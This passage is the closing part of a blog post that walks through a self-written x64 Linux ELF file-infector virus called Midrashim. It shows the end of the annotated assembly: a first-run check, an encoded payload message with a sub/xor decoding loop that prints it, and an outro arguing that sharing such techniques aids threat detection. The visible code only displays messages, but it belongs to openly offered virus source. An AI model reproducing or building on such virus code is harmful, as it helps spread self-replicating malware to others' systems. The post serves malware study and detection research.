<span class="nf">jnz</span> <span class="nv">infected_run</span>                                          <span class="c1">; if control flag != 1, it should be running from an infected file, use normal payload</span>
  <span class="nf">call</span> <span class="nv">show_msg</span>                                           <span class="c1">; if control flag == 1, assume virus is being executed for the first time and display a different message</span>
  <span class="nl">info_msg:</span>
      <span class="kd">db</span> <span class="s">&#39;Midrashim by TMZ (c) 2020&#39;</span><span class="p">,</span> <span class="mh">0xa</span>                 <span class="c1">; not the nicest approach like I mentioned before but quick to implement</span>
      <span class="nf">info_len</span> <span class="err">=</span> <span class="kc">$</span><span class="o">-</span><span class="nv">info_msg</span>
  <span class="nl">show_msg:</span>            
      <span class="nf">pop</span> <span class="nb">rsi</span>                                             <span class="c1">; info_msg address to rsi</span>
      <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_WRITE</span>
      <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">STDOUT</span>                                     <span class="c1">; display payload</span>
      <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">info_len</span>
      <span class="nf">syscall</span>
      <span class="nf">jmp</span> <span class="nb">cl</span><span class="nv">eanup</span>                                         <span class="c1">; cleanup and exit</span>

<span class="nl">infected_run:</span>
  <span class="c1">; 1337 encoded payload, very hax0r</span>
  <span class="nf">call</span> <span class="nv">payload</span>
  <span class="nl">msg:</span>
      <span class="c1">; payload first part</span>
      <span class="kd">db</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x57</span>
      <span class="kd">db</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xa3</span>
      <span class="kd">db</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x98</span>
      <span class="kd">db</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x96</span>
      <span class="nf">...</span>
      <span class="nf">len</span> <span class="err">=</span> <span class="kc">$</span><span class="o">-</span><span class="nv">msg</span>

  <span class="nl">payload:</span>
      <span class="nf">pop</span> <span class="nb">rsi</span>                                             <span class="c1">; setting up decoding loop</span>
      <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="nv">len</span>
      <span class="nf">lea</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">3001</span><span class="p">]</span>

      <span class="nl">.decode:</span>
          <span class="nf">lodsb</span>                                           <span class="c1">; load byte from rsi into al</span>
          <span class="nf">sub</span>  <span class="nb">al</span><span class="p">,</span> <span class="mi">50</span>                                     <span class="c1">; decoding it</span>
          <span class="nf">xor</span>  <span class="nb">al</span><span class="p">,</span> <span class="mi">5</span>
          <span class="nf">stosb</span>                                           <span class="c1">; store byte from al into rdi</span>
          <span class="nf">loop</span> <span class="nv">.decode</span>                                    <span class="c1">; sub 1 from rcx and continue loop until rcx = 0</span>
    
      <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">r15</span> <span class="o">+</span> <span class="mi">3001</span><span class="p">]</span>                               <span class="c1">; decoded payload is at [r15 + 3000]</span>
      <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">SYS_WRITE</span>
      <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">STDOUT</span>                                     <span class="c1">; display payload</span>
      <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">len</span>
      <span class="nf">syscall</span></code></pre></div>

<h2 id="demo">Demo</h2>

<p><a href="https://asciinema.org/a/383841" target="_blank"><img src="https://asciinema.org/a/383841.svg" /></a></p>

<h2 id="outro">Outro</h2>

<p>This ended up being one of my longest projects. I remember coming back to it multiple times during a period of months, sometimes because I was stuck and had to do research and, other times, the Assembly logic fell into oblivion and took me a moment to get back on track with my thoughts.</p>

<p>Many consider <em>Assembly</em> and <em>ELF</em> injection an art form (myself included) and over the decades, new techniques were developed and improved. It&rsquo;s essential to talk about these and share the knowledge in order to improve the detection of threat actors, which are <a href="https://www.bleepingcomputer.com/news/security/linux-malware-authors-use-ezuri-golang-crypter-for-zero-detection/">starting to realize</a> more and more that Linux seems to not be yet a priority of security companies.</p>

<p>In the end, it was one of the most <em>fun</em> and <em>rewarding</em> codes I ever wrote, albeit not really being one of the best.</p>

<p>TMZ</p>

    </div>
    	
      <article>	
        <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "guitmz" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>	
      </article>	
    
    <footer>
      <hr>
      <p>
  Published
  
    
      by <span itemprop="author">Guilherme Thomazi</span>
    
  
  <time itemprop="datePublished" datetime="2021-01-18T21:01:11&#43;02:00">
    18 Jan, 2021
  </time>
  
    in <span itemprop="articleSection"><a href="/categories/technology/">technology</a></span>
  
  
    and tagged <a rel="tag" href="/tags/asm/">asm</a>, <a rel="tag" href="/tags/assembly/">assembly</a>, <a rel="tag" href="/tags/elf/">elf</a>, <a rel="tag" href="/tags/infector/">infector</a>, <a rel="tag" href="/tags/injection/">injection</a>, <a rel="tag" href="/tags/linux/">linux</a>, <a rel="tag" href="/tags/malware/">malware</a>, <a rel="tag" href="/tags/midrashim/">midrashim</a>, <a rel="tag" href="/tags/ozar/">ozar</a>, <a rel="tag" href="/tags/virus/">virus</a>, <a rel="tag" href="/tags/vx/">vx</a> and <a rel="tag" href="/tags/x64/">x64</a>
  
  using <span itemprop="wordCount">3094</span> words.
</p>

      


  <aside>
    <header>Related Content</header>
    <ul>
      
        <li><a href="/running-elf-from-memory/">Running ELF executables from memory</a>
        <time datetime="7M">7 minutes</time>
      
        <li><a href="/having-fun-with-ansi-codes-and-x64-linux-assembly/">Having fun with ANSI codes and x64 Linux Assembly</a>
        <time datetime="9M">9 minutes</time>
      
        <li><a href="/linux-fe2o3-rust-virus/">Linux.Fe2O3: a Rust virus</a>
        <time datetime="4M">4 minutes</time>
      
        <li><a href="/linux-elf-runtime-crypter/">Linux ELF Runtime Crypter</a>
        <time datetime="5M">5 minutes</time>
      
        <li><a href="/linux-cephei-a-nim-virus/">Linux.Cephei: a Nim virus</a>
        <time datetime="3M">3 minutes</time>
      
        <li><a href="/linux-liora/">Linux.Liora: a Go virus</a>
        <time datetime="5M">5 minutes</time>
      
        <li><a href="/more-fun-with-elf-files-and-golang-code-caves/">More fun with ELF files and GoLang - Code Caves</a>
        <time datetime="2M">2 minutes</time>
      
    </ul>
  </aside>


    </footer>
  </article>
</main>
    <footer>
  

  
  <small class="muted">
    This site does not use
    <svg aria-hidden="true" role="presentation" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="12" height="12"><path fill="currentColor" d="M510.52 255.82c-69.97-.85-126.47-57.69-126.47-127.86-70.17 0-127-56.49-127.86-126.45-27.26-4.14-55.13.3-79.72 12.82l-69.13 35.22a132.221 132.221 0 0 0-57.79 57.81l-35.1 68.88a132.645 132.645 0 0 0-12.82 80.95l12.08 76.27a132.521 132.521 0 0 0 37.16 72.96l54.77 54.76a132.036 132.036 0 0 0 72.71 37.06l76.71 12.15c27.51 4.36 55.7-.11 80.53-12.76l69.13-35.21a132.273 132.273 0 0 0 57.79-57.81l35.1-68.88c12.56-24.64 17.01-52.58 12.91-79.91zM176 368c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm32-160c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm160 128c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"></path></svg>
    cookies.
  </small>


</footer>
    
    
    
    <script>fetchInject([
        "https://cdn.jsdelivr.net/npm/baffle@0.3.6/dist/baffle.min.js"
      ]).then(() => {
        baffle(document.querySelector('h1')).start().reveal(1500);
      })
    </script>
  </body>
</html>
